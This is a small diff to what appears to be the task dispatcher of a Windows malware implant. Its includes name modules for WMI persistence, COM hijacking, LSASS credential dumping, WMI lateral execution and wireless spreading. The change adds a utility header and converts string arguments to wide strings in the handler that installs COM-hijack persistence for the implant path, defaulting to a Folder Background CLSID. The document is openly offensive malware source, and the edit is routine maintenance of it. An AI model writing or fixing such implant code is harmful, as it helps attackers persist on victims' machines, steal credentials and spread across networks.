@@ -15,6 +15,7 @@
 #include "../persistence/WmiPersistence.h"
 #include "../persistence/ComHijacker.h"
 #include "../credential/LsassDumper.h"
+#include "../utils/Shared.h"
 #include "../lateral/WmiExec.h"
 #include "../lateral/WirelessSpread.h"
 #include "../fs/FileSystem.h"
@@ -266,7 +267,7 @@ void TaskDispatcher::dispatch(const Task& task) {
                 } else if (cmd.find("com install") == 0) {
                     std::string clsid = "{00021400-0000-0000-C000-000000000046}"; // Folder Background
                     if (cmd.length() > 12) clsid = cmd.substr(12);
-                    if (persistence::ComHijacker::Install(implantPath, clsid))
+                    if (persistence::ComHijacker::Install(utils::s2ws(implantPath), utils::s2ws(clsid)))
                         result.output = "ADV_PERSISTENCE:COM hijacking installed for " + clsid;
                     else result.error = "COM install failed";
                 }
